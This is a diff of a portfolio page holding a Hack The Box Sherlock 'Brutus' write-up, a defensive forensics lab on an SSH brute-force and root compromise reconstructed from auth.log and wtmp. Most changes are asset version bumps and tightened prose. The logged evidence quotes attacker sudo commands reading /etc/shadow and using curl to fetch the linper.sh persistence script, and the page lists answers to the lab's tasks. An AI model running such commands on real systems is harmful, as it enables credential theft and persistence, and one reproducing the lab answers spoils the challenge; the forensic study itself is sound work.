@@ -9,25 +9,26 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css?v=20261013b">
-  <link rel="stylesheet" href="/assets/css/premium.css?v=20261013b">
-<link rel="stylesheet" href="/assets/css/studio.css?v=20261013b">
+  <link rel="stylesheet" href="/assets/css/style.css?v=20261017">
+  <link rel="stylesheet" href="/assets/css/premium.css?v=20261017">
+<link rel="stylesheet" href="/assets/css/studio.css?v=20261017">
 <link rel="icon" href="/assets/media/favicon.svg" type="image/svg+xml">
-<meta name="theme-color" content="#0b1016">
+<meta name="theme-color" content="#121411">
+  <link rel="stylesheet" href="/assets/css/journal.css?v=20261017">
 </head>
-<body data-visual-style="editorial">
+<body data-visual-style="editorial" data-page-kind="article">
   <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">Thai Ngoc<span aria-hidden="true">.</span></a><nav class="nav"><a href="/">Home</a><a href="/projects/">Projects</a><a class="active" href="/writeups/">Writeups</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
   <main class="page htb-brutus-page"><div class="wrap article-layout">
     <aside class="toc"><div class="toc-title">On this page</div><a href="#overview">Overview</a><a href="#artifacts">Artifacts</a><a href="#methodology">Methodology</a><a href="#accepted">Successful Logins</a><a href="#failed">Brute-force Evidence</a><a href="#enrichment">IP Enrichment</a><a href="#wtmp">wtmp Sessions</a><a href="#persistence">Persistence</a><a href="#commands">Sudo Evidence</a><a href="#timeline">Timeline</a><a href="#answers">Task Answers</a><a href="#lessons">Lessons</a></aside>
     <article class="article-card glass">
       <div class="eyebrow">Hack The Box Sherlock · Linux Forensics / Log Analysis</div>
       <h1 class="page-title">HTB Sherlock: Brutus</h1>
-      <p class="lead">A Linux authentication investigation using <code>auth.log</code> and <code>wtmp</code>. I reconstructed an SSH brute-force attack, confirmed the compromised root account, identified the real interactive session, tracked local account persistence and extracted the final sudo command used after compromise.</p>
+      <p class="lead">Reconstructing an SSH compromise from <code>auth.log</code> and <code>wtmp</code>, including the root login, interactive session, new local account and subsequent sudo command.</p>
       <div class="info-card"><div class="item"><div class="label">Challenge</div><div class="value">Brutus</div></div><div class="item"><div class="label">Platform</div><div class="value">Hack The Box</div></div><div class="item"><div class="label">Type</div><div class="value accent">Sherlock</div></div><div class="item"><div class="label">Difficulty</div><div class="value">Very Easy</div></div><div class="item"><div class="label">Artifacts</div><div class="value">auth.log, wtmp, utmp.py</div></div><div class="item"><div class="label">Focus</div><div class="value">SSH brute force, Linux sessions, persistence</div></div></div>
       <div class="callout"><strong>Investigation goal:</strong> identify the brute-force source IP, confirm the compromised account, determine when the attacker established a terminal session, track the persistence account and extract the final privileged command.</div>
 
       <h2 id="overview">Scenario Overview</h2>
-      <p>The scenario describes a Confluence server that was attacked through SSH. The important part is that the evidence does not stop at failed passwords. The same <code>auth.log</code> also contains successful authentication, PAM sessions, local account creation, sudo group modification and privileged command execution. The <code>wtmp</code> artifact then gives a separate view of real terminal sessions.</p>
+      <p>The server in the scenario runs Confluence, but the observed access is through SSH. <code>auth.log</code> records password attempts, successful authentication, PAM sessions, account changes and sudo commands. <code>wtmp</code> supplies a second view of terminal sessions.</p>
       <div class="mindset"><strong>What I thought first:</strong> if this is an SSH brute-force case, I should not only count failed logins. I need to connect failed attempts, accepted logins, session creation and post-login actions. Otherwise I might find noise but miss the actual compromise chain.</div>
 
       <h2 id="artifacts">Artifacts and First Look</h2>
@@ -48,7 +49,7 @@ Mar  6 06:19:54 sshd[1465]: <span class="ok">Accepted password</span> for <span 
 Mar  6 06:31:40 sshd[2411]: <span class="ok">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 34782 ssh2
 Mar  6 06:32:44 sshd[2491]: <span class="ok">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 53184 ssh2
 Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span class="user">cyberjunkie</span> from <span class="ip">65.2.161.68</span> port 43260 ssh2</div>
-      <p>I did not mark <code>65.2.161.68</code> as the attacker only because it had accepted logins. The stronger reason came from correlation: the same IP also produced failed login attempts shortly before the successful root authentication, then appeared again after a new local account was created.</p>
+      <p>The correlation around <code>65.2.161.68</code> is what matters: failed attempts were followed by root authentication, creation of a new local account and another login from the same address.</p>
 
       <h2 id="failed">Brute-force Evidence</h2>
       <p>Next I searched failed password events. The raw output contained both real local accounts and <code>invalid user</code> attempts. Invalid-user attempts are still suspicious, but for the task I needed to understand which valid accounts were attacked.</p>
@@ -78,7 +79,7 @@ Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span 
       <p>This is local-account persistence. The attacker used the compromised <code>root</code> account to create <code>cyberjunkie</code>, assign it a password, give it <code>/bin/bash</code> as a shell, add it to <code>sudo</code>, and then log in through SSH using that account. The MITRE ATT&amp;CK mapping is <code>T1136.001 - Create Account: Local Account</code>.</p>
 
       <h2 id="commands">Sudo Command Evidence</h2>
-      <p>The root session and the new account were not the end of the story. Sudo logs showed that <code>cyberjunkie</code> executed privileged commands from <code>/home/cyberjunkie</code> on <code>pts/1</code>.</p>
+      <p>I checked what <code>cyberjunkie</code> did with sudo. The records place its commands in <code>/home/cyberjunkie</code> on <code>pts/1</code>.</p>
       <figure class="evidence-shot"><figcaption><span>Evidence 09</span><span>Root session, sudo activity and script retrieval</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/07-root-session-and-sudo-events.png" alt="auth.log timeline showing root session cyberjunkie sudo commands and curl command"></figure>
       <div class="terminal-window">Mar  6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">/usr/bin/cat /etc/shadow</span>
 Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></div>
@@ -91,14 +92,15 @@ Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=roo
       <div class="answer-grid"><div class="answer-card"><div class="q">Task 1 · Brute-force IP</div><code>65.2.161.68</code></div><div class="answer-card"><div class="q">Task 2 · Compromised account</div><code>root</code></div><div class="answer-card"><div class="q">Task 3 · Manual login timestamp</div><code>2024-03-06 06:32:45</code></div><div class="answer-card"><div class="q">Task 4 · Session number</div><code>37</code></div><div class="answer-card"><div class="q">Task 5 · Persistence account</div><code>cyberjunkie</code></div><div class="answer-card"><div class="q">Task 6 · MITRE sub-technique</div><code>T1136.001</code></div><div class="answer-card"><div class="q">Task 7 · First SSH session end</div><code>2024-03-06 06:37:24</code></div><div class="answer-card"><div class="q">Task 8 · Sudo command</div><code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></div></div>
 
       <h2 id="lessons">Lessons Learned</h2>
-      <p>This lab is useful for SOC fundamentals because it shows how much can be reconstructed from Linux authentication artifacts. One <code>auth.log</code> file can reveal failed SSH attempts, successful authentication, PAM sessions, account creation, group membership changes and sudo commands. <code>wtmp</code> then gives a second source of truth for real interactive sessions.</p>
+      <p><code>auth.log</code> connected the SSH attempts to account creation and privileged commands. <code>wtmp</code> supplied timing for the interactive root session and the later login.</p>
       <div class="pill-row"><span class="pill">auth.log</span><span class="pill">wtmp</span><span class="pill">SSH brute force</span><span class="pill">Linux persistence</span><span class="pill">sudo evidence</span></div>
       <ul><li>Do not stop at failed-login counts. Always correlate with successful authentication.</li><li>Separate <code>invalid user</code> attempts from valid-user attempts when the question asks about real compromised accounts.</li><li>Use <code>wtmp</code> to confirm terminal sessions instead of relying only on SSH authentication lines.</li><li>Local user creation plus sudo group membership is strong persistence evidence.</li><li>Sudo logs can expose attacker intent after login, including credential access and script retrieval.</li></ul>
       <div class="callout"><strong>Final conclusion:</strong> the attacker brute-forced SSH from <code>65.2.161.68</code>, compromised <code>root</code>, established a manual session at <code>2024-03-06 06:32:45</code>, created a privileged local account named <code>cyberjunkie</code> for persistence, and used that account to execute privileged commands.</div>
     </article>
   </div></main>
-  <script src="/assets/js/main.js?v=20261013b"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("home-bg-mode");document.body.classList.add("writeups-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initWriteupBackground(false);}</script>
-<script src="/assets/js/premium.js?v=20261013b"></script>
-<script src="/assets/js/studio.js?v=20261013b"></script>
+  <script src="/assets/js/main.js?v=20261017"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("home-bg-mode");document.body.classList.add("writeups-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initWriteupBackground(false);}</script>
+<script src="/assets/js/premium.js?v=20261017"></script>
+<script src="/assets/js/studio.js?v=20261017"></script>
+  <script src="/assets/js/journal.js?v=20261017"></script>
 </body>
 </html>
